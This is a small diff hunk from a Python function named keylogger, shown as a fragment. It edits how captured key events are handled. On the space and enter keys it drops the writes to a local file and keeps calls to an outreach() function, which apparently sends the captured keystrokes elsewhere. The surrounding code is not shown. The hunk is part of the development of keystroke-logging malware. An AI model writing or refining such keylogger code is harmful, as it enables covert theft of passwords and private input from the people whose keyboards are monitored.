@@ -43,13 +43,11 @@ def keylogger():
 
             if event.name == 'space':
                 char = '\n'
-                file.write(char)
                 outreach()
 
 
             elif event.name == 'enter':
                 char = '\n'
-                file.write(char)
                 outreach()
 
             file.close()
